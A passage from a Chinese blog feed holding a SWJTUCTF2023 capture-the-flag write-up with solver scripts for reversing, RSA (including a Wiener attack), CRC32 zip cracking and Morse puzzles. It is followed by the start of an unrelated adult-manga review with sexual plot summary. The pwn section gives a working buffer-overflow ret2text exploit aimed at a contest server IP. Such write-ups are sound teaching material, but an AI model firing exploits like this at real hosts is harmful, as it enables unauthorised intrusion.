class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> z3 import *<br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">str1= BitVec(&#x27;</span>str1<span class="hljs-string">&#x27;,32)</span><br><span class="hljs-string">str2= BitVec(&#x27;</span>str2<span class="hljs-string">&#x27;,32)</span><br><span class="hljs-string">str3= BitVec(&#x27;</span>str3<span class="hljs-string">&#x27;,32)</span><br><span class="hljs-string">str4= BitVec(&#x27;</span>str4<span class="hljs-string">&#x27;,32)</span><br><span class="hljs-string">str5= BitVec(&#x27;</span>str5<span class="hljs-string">&#x27;,32)</span><br><span class="hljs-string">str6= BitVec(&#x27;</span>str6<span class="hljs-string">&#x27;,32)</span><br><span class="hljs-string">str7= BitVec(&#x27;</span>str7<span class="hljs-string">&#x27;,32)</span><br><span class="hljs-string">str8= BitVec(&#x27;</span>str8<span class="hljs-string">&#x27;,32)&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br>str1= Int(<span class="hljs-string">&#x27;str1&#x27;</span>)<br>str2= Int(<span class="hljs-string">&#x27;str2&#x27;</span>)<br>str3= Int(<span class="hljs-string">&#x27;str3&#x27;</span>)<br>str4= Int(<span class="hljs-string">&#x27;str4&#x27;</span>)<br>str5= Int(<span class="hljs-string">&#x27;str5&#x27;</span>)<br>str6= Int(<span class="hljs-string">&#x27;str6&#x27;</span>)<br>str7= Int(<span class="hljs-string">&#x27;str7&#x27;</span>)<br>str8= Int(<span class="hljs-string">&#x27;str8&#x27;</span>)<br><br>s = Solver()<br>s.<span class="hljs-built_in">add</span>(7 * str2 + 5 * str1 + 9 * str4 + 3 * str3 == 0x8890B8EAF)<br>s.<span class="hljs-built_in">add</span>(11 * str1 + 4 * str2 + 14 * str4 - 5 * str3 == 0x6E4E0B659)<br>s.<span class="hljs-built_in">add</span>(3 * str2 + 2 * str1 + 5 * str4 + 7 * str3 == 0x666D55132)<br>s.<span class="hljs-built_in">add</span>(19 * (str2 + str1) + 8 * str3 + 10 * str4 == 0x166017287C)<br>s.<span class="hljs-built_in">add</span>(7 * str6 + 3 * str5 + 11 * str8 + 5 * str7 == 0x70696B27A)<br>s.<span class="hljs-built_in">add</span>(11 * str6 + 5 * str5 + 3 * str8 + 7 * str7 == 0x7F159CC9A)<br>s.<span class="hljs-built_in">add</span>(5 * str6 + 7 * str5 + 5 * str8 + 11 * str7 == 0x9D6020A7A)<br>s.<span class="hljs-built_in">add</span>(7 * str6 + 11 * str5 + 5 * str8 + 3 * str7 == 0x891CEDA30)<br><br>s.check()<br><br><span class="hljs-attribute">result</span>=s.model()<br><br><br><span class="hljs-keyword">if</span> s.check()==sat:<br>    <span class="hljs-built_in">print</span>(s.model())<br><br>sorted_keys = sorted(decimal_numbers.keys())<br>result_string = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> sorted_keys:<br>    decimal_number = decimal_numbers[key]<br>    hex_value = hex(decimal_number)[2:]  # 转换为16进制，并去掉前缀<span class="hljs-string">&#x27;0x&#x27;</span><br>    ascii_value = <span class="hljs-string">&#x27;&#x27;</span>.join([chr(int(hex_value[i:i+2], 16)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, len(hex_value), 2)])<br>    result_string += ascii_value<br><br><span class="hljs-built_in">print</span>(result_string)<br><br>flag&#123;z3_s0Lv3r_is_g00D_3nG1n33r&#125;<br></code></pre></td></tr></table></figure><h2 id="Bytecode"><a href="#Bytecode" class="headerlink" title="Bytecode"></a>Bytecode</h2><p>看好多人都出了，尝试chatgpt一把出（）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_encode</span>(<span class="hljs-params">encoded_flag</span>):<br>    <span class="hljs-comment"># Decode the base64-encoded flag</span><br>    decoded_flag_bytes = base64.b64decode(encoded_flag.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    decoded_flag = decoded_flag_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>    <span class="hljs-comment"># Reverse the encoding process used in the &#x27;encode&#x27; function</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> decoded_flag:<br>        result += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(char) ^ <span class="hljs-number">48</span>)<br><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment"># 提供的正确 flag 的 base64 编码</span><br>correct_flag_encoded = <span class="hljs-string">&#x27;VlxRV0tgSWRYAF5vUmlEA1MAVANvAUNvBEcDQwBdA00=&#x27;</span><br><br><span class="hljs-comment"># 逆向生成正确的 flag</span><br>correct_flag = reverse_encode(correct_flag_encoded)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;The correct flag is: <span class="hljs-subst">&#123;correct_flag&#125;</span>&quot;</span>)<br><br>flag&#123;PyTh0n_bYt3c0d3_1s_4w3s0m3&#125;<br></code></pre></td></tr></table></figure><h1 id="cry"><a href="#cry" class="headerlink" title="cry"></a>cry</h1><h2 id="EZ-RSA"><a href="#EZ-RSA" class="headerlink" title="EZ RSA"></a>EZ RSA</h2><p>直接出</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs makefile">import gmpy2<br>from Crypto.Util.number import long_to_bytes<br>e = 65537<br>p = 12102983598154937379315785127099550840985727618237082180162085985167084933561161279268942980177662979942144953032037841070873301613382376241858293934304209<br>q = 12403196145109938975011375002634547459059104019966363021742657133337573085876556825580498463205099277263128822527604410171105171646901589877183491056155337<br>c = 129612979273416421816537033819218284703021320022981672820766669034757243871021108288723616702354354879062023657599687435296687897897743917379885777766048371550973990976449823084855205289026424806598007143347728335183818450193709016190122357072529869738506836202420956648629083492453768424156318922410550719790<br><br><span class="hljs-comment"># n = 73069886771625642807435783661014062604264768481735145873508846925735521695159</span><br>n = q*p<br><span class="hljs-comment"># print(n)</span><br>d = gmpy2.invert(e, (p - 1) * (q - 1))<br>print(<span class="hljs-string">&quot;d=&quot;</span>,d)<br>m = pow(c, d, n)<br>print(m)<br>print(long_to_bytes(m))<br><br>flag&#123;w4rm_up_f0r_th3_sqli_ch4ll3ng3!&#125;<br></code></pre></td></tr></table></figure><h2 id="BIG-E"><a href="#BIG-E" class="headerlink" title="BIG E"></a>BIG E</h2><p>常见渐近攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>e=<span class="hljs-number">41840811944637597583277228634048780824116627021161849011763189204272107022928048313230470352556644499970875083414414554072395802964006664198095784166622812134801378479822801680849334791516706905289487124827033021028870588220816699066980040019624523321637136441897064508221892556466633995610675541260018174579</span><br><br>n=<span class="hljs-number">76274124714962120203913916504866549753664420806699436357636523187297979610473061760317722260237390565705410135560323945870522924434169552153153601489063497242134235987643560070823343966372625360367442335410214007519980792480671542801910908972666947102839249021628596715576301578915400499096584523993420757841</span><br><br>c=<span class="hljs-number">52378175365646132208800472845382204063428788681911495007854208644129490618305676279539827117849613521093003691344722433784424438364818678820596525214909411557399327496137301638990373845262570075459110946253199433615944044298039904262305966735934387866600302771339575477525860362538586046936583581843708708780</span><br><br><span class="hljs-comment"># numerator(n):分子, denominator(d)：分母</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">t_cf</span>(<span class="hljs-params">n, d</span>):  <span class="hljs-comment"># 将分数 x/y 转为连分数的形式</span><br>    res = []<br>    <span class="hljs-keyword">while</span> d:<br>        res.append(n // d)<br>        n, d = d, n % d<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cf</span>(<span class="hljs-params">sub_res</span>):    <span class="hljs-comment"># 得到渐进分数的分母和分子</span><br>    n, d = <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sub_res[::-<span class="hljs-number">1</span>]:  <span class="hljs-comment"># 从后面往前循环</span><br>        d, n = n, i * n + d<br>    <span class="hljs-keyword">return</span> d, n<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_fraction</span>(<span class="hljs-params">x, y</span>):     <span class="hljs-comment"># 列出每个渐进分数</span><br>    res = t_cf(x, y)<br>    res = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(cf, (res[<span class="hljs-number">0</span>:i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(res)))))  <span class="hljs-comment"># 将连分数的结果逐一截取以求渐进分数</span><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pq</span>(<span class="hljs-params">a, b, c</span>):  <span class="hljs-comment"># 由p+q和pq的值通过维达定理来求解p和q(解二元一次方程)</span><br>    par = gmpy2.isqrt(b * b - <span class="hljs-number">4</span> * a * c)  <span class="hljs-comment"># 由上述可得，开根号一定是整数，因为有解</span><br>    x1, x2 = (-b + par) // (<span class="hljs-number">2</span> * a), (-b - par) // (<span class="hljs-number">2</span> * a)<br>    <span class="hljs-keyword">return</span> x1, x2<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wienerAttack</span>(<span class="hljs-params">e, n</span>):<br>    <span class="hljs-keyword">for</span> (d, k) <span class="hljs-keyword">in</span> list_fraction(e, n):  <span class="hljs-comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span><br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>:  <span class="hljs-comment"># 可能会出现连分数的第一个为0的情况，排除</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:  <span class="hljs-comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span><br>            <span class="hljs-keyword">continue</span><br><br>        phi = (e * d - <span class="hljs-number">1</span>) // k  <span class="hljs-comment"># 这个结果就是 φ(n)</span><br><br>        px, qy = get_pq(<span class="hljs-number">1</span>, n - phi + <span class="hljs-number">1</span>, n)<br><br>        <span class="hljs-keyword">if</span> px * qy == n:<br>            p, q = <span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(px)), <span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(qy))  <span class="hljs-comment"># 可能会得到两个负数，负负得正未尝不会出现</span><br>            d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))  <span class="hljs-comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span><br>            <span class="hljs-keyword">return</span> d<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;求解d失败&quot;</span>)<br><br>d=wienerAttack(e, n) <br><span class="hljs-built_in">print</span>(d)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br>flag&#123;b1gg3r_th4n_b1gg3r&#125;<br></code></pre></td></tr></table></figure><h2 id="Inception"><a href="#Inception" class="headerlink" title="Inception"></a>Inception</h2><p>套套套娃，最后是8进制（）</p><p>菜谱：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">From_Base64</span><span class="hljs-params">(<span class="hljs-string">&#x27;A-Za-z0-9+/=&#x27;</span>,true,false)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Base85</span><span class="hljs-params">(<span class="hljs-string">&#x27;!-u&#x27;</span>,true,<span class="hljs-string">&#x27;z&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Hex</span><span class="hljs-params">(<span class="hljs-string">&#x27;Auto&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Base64</span><span class="hljs-params">(<span class="hljs-string">&#x27;A-Za-z0-9+/=&#x27;</span>,true,false)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Base64</span><span class="hljs-params">(<span class="hljs-string">&#x27;A-Za-z0-9+/=&#x27;</span>,true,false/disabled)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Base32</span><span class="hljs-params">(<span class="hljs-string">&#x27;A-Z2-7=&#x27;</span>,true)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Base64</span><span class="hljs-params">(<span class="hljs-string">&#x27;A-Za-z0-9+/=&#x27;</span>,true,false)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Base85</span><span class="hljs-params">(<span class="hljs-string">&#x27;!-u&#x27;</span>,true,<span class="hljs-string">&#x27;z&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Base85</span><span class="hljs-params">(<span class="hljs-string">&#x27;!-u&#x27;</span>,true,<span class="hljs-string">&#x27;z&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Base64</span><span class="hljs-params">(<span class="hljs-string">&#x27;A-Za-z0-9+/=&#x27;</span>,true,false)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Base85</span><span class="hljs-params">(<span class="hljs-string">&#x27;!-u&#x27;</span>,true,<span class="hljs-string">&#x27;z&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Base32</span><span class="hljs-params">(<span class="hljs-string">&#x27;A-Z2-7=&#x27;</span>,true)</span></span><br><span class="hljs-function"><span class="hljs-title">From_Hex</span><span class="hljs-params">(<span class="hljs-string">&#x27;Auto&#x27;</span>/breakpoint)</span></span><br></code></pre></td></tr></table></figure><p>每行后面一个&#x3D;应该意识到是空格空格这种形式</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p><em><strong>经典的只会nc和ret2text</strong></em></p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><br><span class="hljs-attribute">p</span>=remote(&#x27;111.230.195.55&#x27;,28060)<br><br><span class="hljs-attribute">shelladr</span>=0x4006B6<br><br><span class="hljs-attribute">payload</span>=b&#x27;&#x27;<br><br>payload+=b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x28<br>payload+=p64(shelladr)<br><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="F12"><a href="#F12" class="headerlink" title="F12"></a>F12</h2><p>在跳转页面F12···卡了，怎么现在这么瓜</p><h2 id="Tic-Tac-Toe"><a href="#Tic-Tac-Toe" class="headerlink" title="Tic Tac Toe"></a>Tic Tac Toe</h2><p>用burp代理，改包覆盖AI下棋的位置</p><p>原题：</p><h2 id="Do-you-like-JavaScript"><a href="#Do-you-like-JavaScript" class="headerlink" title="Do you like JavaScript?"></a>Do you like JavaScript?</h2><p>找了一些JavaScript在线反混淆（？</p><p>用了这个</p><p><a href="https://www.sojson.com/jsjiemi.html">https://www.sojson.com/jsjiemi.html</a> </p><p>[]: <a href="https://www.sojson.com/jsjiemi.html">https://www.sojson.com/jsjiemi.html</a></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="EZ-LSB"><a href="#EZ-LSB" class="headerlink" title="EZ LSB"></a>EZ LSB</h2><p>用stegsolver直接读</p><h2 id="EZ-ZIP"><a href="#EZ-ZIP" class="headerlink" title="EZ ZIP"></a>EZ ZIP</h2><p>CRC32爆破</p><p>不过最后四位怎么也出不来，根据前后文才出来的</p><p><img src="/../../images/SWJTUCTF2023/image-20231212172256663.png" alt="image-20231212172256663"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> binascii import crc32<br>import string<br>import zipfile<br><span class="hljs-attribute">dic</span>=string.printable<br>def CrackCrc(crc):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic :<br>        # <span class="hljs-built_in">print</span> (i)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> dic:<br>                <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> dic:<br>                    <span class="hljs-attribute">s</span>=i+j+p+q<br>                    # <span class="hljs-built_in">print</span> (crc32(bytes(s,<span class="hljs-string">&#x27;ascii&#x27;</span>)) &amp; 0xffffffff)<br>                    <span class="hljs-keyword">if</span> crc == (crc32(bytes(s,<span class="hljs-string">&#x27;ascii&#x27;</span>)) &amp; 0xffffffff):<br>                        <span class="hljs-built_in">print</span> (s)<br>                        return<br><br>def getcrc32(fname):<br>    l=[]<br>    file = fname<br>    f = zipfile.ZipFile(file, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    global fileList<br>    fileList =f.namelist ()<br>    <span class="hljs-built_in">print</span> (fileList)<br>    # <span class="hljs-built_in">print</span> (type(fileList))<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> fileList:<br>        Fileinfo = f.getinfo(filename)<br>        # <span class="hljs-built_in">print</span>(Fileinfo)<br>        crc = Fileinfo.CRC<br>        # <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;crc&#x27;</span>,crc)<br>        l.append(crc)<br>    return l<br><br>def main (<span class="hljs-attribute">filename</span>=None):<br>    l = getcrc32(filename)<br>    # <span class="hljs-built_in">print</span>(l)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(l)):<br>        <span class="hljs-built_in">print</span>(fileList[i], <span class="hljs-attribute">end</span>=<span class="hljs-string">&#x27;的内容是:&#x27;</span>)<br>        CrackCrc(l[i])<br><br><span class="hljs-keyword">if</span> __name__  == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main (<span class="hljs-string">&#x27;ez_zip.zip&#x27;</span>)<br>    <br>0的内容是:1的内容是:cr4c<br>2的内容是:k_th<br>3的内容是:3_w0<br></code></pre></td></tr></table></figure><h2 id="Kobe"><a href="#Kobe" class="headerlink" title="Kobe"></a>Kobe</h2><p>binwalk出了一个压缩包，伪加密修改标志位</p><p>hidden是hex直接转</p><h2 id="Black-Tea"><a href="#Black-Tea" class="headerlink" title="Black Tea"></a>Black Tea</h2><p><img src="/../../images/SWJTUCTF2023/AAAAA(1).gif" alt="AAAAA(1)"></p><p>convert出了297张，先辈叫，张嘴1闭嘴0排列得到</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">1011101110001010101110111000101110101000111010111010001110111011101110111000111011100010001110001110001110111011101110111000111000101010101000101010100010111011101110111000111011100011101110111011101110001110001110101110001010001110111010101000101110001110111010100010101010111000101110111000101110<br></code></pre></td></tr></table></figure><p>猜测是摩斯密码，确定长波短波，想了一阵····</p><p>10是短1110是长00是截断···</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">W3LC0METT0T5H1MT</span><br>W3LC0METT0T5H1MT<br></code></pre></td></tr></table></figure><h1 id="后面"><a href="#后面" class="headerlink" title="后面"></a>后面</h1><p><img src="/../../images/SWJTUCTF2023/image-20231212174358337.png" alt="image-20231212174358337"></p><p>被8000昏先辈狠狠蹂躏了，还是逊逊······</p><p>题目真的都很好，re部分算把几个常见的方面概括了，整理了自己的工具（难的不会），misc有挺多题，感觉都不戳，后面有了官方wp也会复现misc和pwn。</p><p>源码待提供</p><p>菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>本子推荐说----better than xxx</title>
    <link href="/2023/11/30/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/"/>
    <url>/2023/11/30/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/</url>
    
    <content type="html"><![CDATA[<h2 id="better-than-sex"><a href="#better-than-sex" class="headerlink" title="better than sex"></a>better than sex</h2><p><em><strong>大概只是个测试，谢谢你的看到</strong></em></p><p><em><strong>本文作者：nobu</strong></em></p><p>故事讲述了 男主花了800万买下了订制sex机器人——千寻。千寻的原型是以男主的学姐千寻为原型制作的。</p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170655.jpg" alt="微信图片_20231130170655"></p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170703.jpg" alt="微信图片_20231130170703"></p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170706.jpg" alt="微信图片_20231130170706"></p><p>男主用机器人狠狠毕业后，与机器人开始了同居生活。</p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170710.jpg" alt="微信图片_20231130170710"></p><p>​一次路上学姐偶遇男主对男主进行了狩猎，男主将学姐带回家后，学姐见到了以自己为原型制作的机器人，并欣然接受了她的存在，开了3p生活。</p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170721.jpg" alt="微信图片_20231130170721"></p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170744.jpg" alt="微信图片_20231130170744"></p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170737.jpg" alt="微信图片_20231130170737"></p><p>​在家时他们遇到了反对性爱机器人的组织的骚扰。</p><p>​后来他们将学姐误认为机器人抓走并凌辱，机器人和男主前来营救，赶走敌人后，机器人千寻重伤，不能再以现在身体维持，学姐提出把性偶千寻意识转移到自己身体上，性偶千寻拒绝，经三人争辩后，以sex比赛的方式，决定是否把机器人千寻的意识转移到学姐身体里。最终性偶千寻被转移到学姐身体上。</p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170733.jpg" alt="微信图片_20231130170733"></p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170809.jpg" alt="微信图片_20231130170809"></p><p>​首先是研そうげ老师精湛时髦的画风。不能说很色，只能说十分之色的裤子冲爆🥴我个人比较喜欢这种漫画剧情向本子和更倾向于正作漫画的画风。</p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170812.jpg" alt="微信图片_20231130170812"></p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170820.jpg" alt="微信图片_20231130170820"></p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170826.jpg" alt="微信图片_20231130170826"></p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170830.jpg" alt="微信图片_20231130170830"></p><p><img 